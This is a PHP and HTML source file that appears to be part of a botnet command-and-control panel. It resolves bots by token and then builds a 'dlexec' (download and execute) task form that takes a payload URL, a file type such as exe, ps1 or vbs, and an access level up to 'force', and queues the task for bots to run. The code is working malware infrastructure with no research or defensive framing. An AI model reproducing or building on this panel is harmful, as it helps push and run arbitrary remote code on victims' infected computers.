<?php
     $param = array();
     @$curr_group = $group->GetData($_GET['group']);
     if(empty($curr_group)){
         
         $curr_bot = $bots->GetData($_GET['bot']); 
         $curr_user = $user->GetData($curr_bot['USER_TOKEN']);
         if(!$bots->UserMatch($curr_bot['TOKEN'], $curr_user['TOKEN'])){
             die();
         }else{
             $param['BOT_TOKEN'] = $curr_bot['TOKEN'];
         }
     
     }
if (isset($_POST['AddTask'])) {
    if ($_POST['p'] == "add_task") {
        if ($_GET['type'] == "dlexec") {
           
            $param['USER_TOKEN'] = $curr_user['TOKEN'];

            $param['EXPIRE'] = $_POST['expiredate'];
            $param['TYPE'] = $_GET['type'];
            $param['GROUP_TOKEN'] = $curr_group['TOKEN'];
           
            if (isset($_POST['runonce'])) {
                $param['RUN_ONCE'] = "true";
            } else {
                $param['RUN_ONCE'] = "false";
            }
            if (isset($_POST['status'])) {
                $param['STATUS'] = "true";
            } else {
                $param['STATUS'] = "false";
            }
            //*Custum data
            $param['ARG_ARRAY']["URL"] = @$_POST['url'];
            $param['ARG_ARRAY']["FILE_TYPE"] = @$_POST['type'];
            $param['ARG_ARRAY']["ACCESS"] = @$_POST['access'];

            $tasks->Add($param);
        }
    }
}

?>
</div>
<div class="form-check d-flex gap-4">

    <div class="form-check">
        <input class="form-check-input" type="checkbox" value="" id="runonce" name="runonce" checked>
        <label class="form-check-label" for="runonce">
            Run Once
        </label>
    </div>
    <div class="form-check">
        <input class="form-check-input" type="checkbox" value="" id="status" name="status" checked>
        <label class="form-check-label" for="status">
            Status
        </label>
    </div>
</div>
<hr>
<h6>Expire date</h6>
<div class="input-group">
    <span class="input-group-text"><i class="fa-light fa-info"></i></span>
    <input type="datetime-local" name="expiredate" class="form-control" placeholder="Default" value="Default">
</div>
<br>
<h6>Url</h6>
<div class="input-group">
    <span class="input-group-text"><i class="fa-light fa-info"></i></span>
    <input type="text" name="url" class="form-control" placeholder="url" value="">
</div>
<br>

<h6>File extention</h6>
<div class="input-group">
    <span class="input-group-text"><i class="fa-light fa-info"></i></span>
    <select class="form-select" name="type" aria-label="Type">
        <option value="EXE">exe</option>
        <option value="BAT">bat</option>
        <option value="PS1">ps1</option>
        <option value="VBS">vbs</option>
        <option value="JS">js</option>
        <option value="PY">py</option>

    </select>
</div>

<h6>Access</h6>
<div class="input-group">
    <span class="input-group-text"><i class="fa-light fa-info"></i></span>
    <select class="form-select" name="access" aria-label="access">
        <option value="user">User</option>
        <option value="admin">admin</option>
        <option value="force">force</option>

    </select>
</div>



<hr>